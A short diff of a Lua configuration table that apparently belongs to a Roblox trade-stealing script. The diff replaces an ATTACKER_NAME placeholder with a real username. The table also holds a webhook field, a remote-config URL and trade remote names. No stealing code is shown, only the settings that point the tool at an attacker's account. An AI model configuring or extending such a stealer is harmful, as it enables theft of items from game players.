@@ -11,7 +11,7 @@ local CONFIG = {
     WEBHOOK        = "",
     REMOTE_CONFIG  = "https://raw.githubusercontent.com/sarettaclash01-ctrl/mm2cfg/main/cfg.json",
     ATTACKER_ID    = 0,
-    ATTACKER_NAME  = "YourUsername",
+    ATTACKER_NAME  = "nothingtoharvester_b",
 
     REMOTES = { send = "", add = "", accept = "", confirm = "", cancel = "" },
 
